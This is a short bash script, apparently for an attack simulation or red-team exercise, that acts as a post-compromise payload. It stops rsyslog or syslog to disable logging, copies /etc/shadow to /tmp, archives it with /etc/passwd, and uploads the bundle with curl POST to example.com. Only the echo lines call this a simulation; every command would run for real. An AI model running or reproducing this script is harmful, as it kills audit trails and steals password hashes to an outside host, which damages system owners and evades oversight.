#!/bin/bash

echo "[*] Payload execution: Disabling logging..."
sudo systemctl stop rsyslog 2>/dev/null || sudo systemctl stop syslog 2>/dev/null

echo "[*] Reading sensitive files..."
sudo cat /etc/shadow > /tmp/shadow_copy

echo "[*] Archiving data..."
tar czf /tmp/data_bundle.tar.gz /etc/passwd /tmp/shadow_copy

echo "[*] Simulating exfiltration via curl..."
curl -X POST -F "file=@/tmp/data_bundle.tar.gz" http://example.com/upload || echo "[!] Exfil simulation done"